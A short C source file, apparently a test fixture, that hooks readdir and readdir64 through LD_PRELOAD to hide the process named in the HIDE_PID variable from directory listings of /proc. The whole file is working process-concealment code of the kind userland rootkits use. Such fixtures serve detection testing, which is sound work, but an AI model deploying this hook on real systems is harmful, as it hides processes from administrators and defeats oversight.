/*
 * libhidepid.c - Userspace Process Concealment Test Fixture
 *
 * PURPOSE:
 * This fixture is a testing aid for simulating userspace process concealment.
 * It intercepts directory enumeration functions (readdir / readdir64) via LD_PRELOAD
 * and omits directory entries corresponding to the target PID specified in HIDE_PID.
 *
 * NOTE:
 * This is strictly a userspace shared-library hook for controlled evaluation.
 * It is NOT a kernel-level rootkit and does not modify kernel data structures.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>

static struct dirent* (*orig_readdir)(DIR *) = NULL;
static struct dirent64* (*orig_readdir64)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    char *hide_pid = getenv("HIDE_PID");
    struct dirent *entry;
    
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (hide_pid && strcmp(entry->d_name, hide_pid) == 0) {
            /* Omit target PID from directory stream */
            continue;
        }
        return entry;
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    if (!orig_readdir64) {
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    }
    
    char *hide_pid = getenv("HIDE_PID");
    struct dirent64 *entry;
    
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (hide_pid && strcmp(entry->d_name, hide_pid) == 0) {
            /* Omit target PID from directory stream */
            continue;
        }
        return entry;
    }
    return NULL;
}
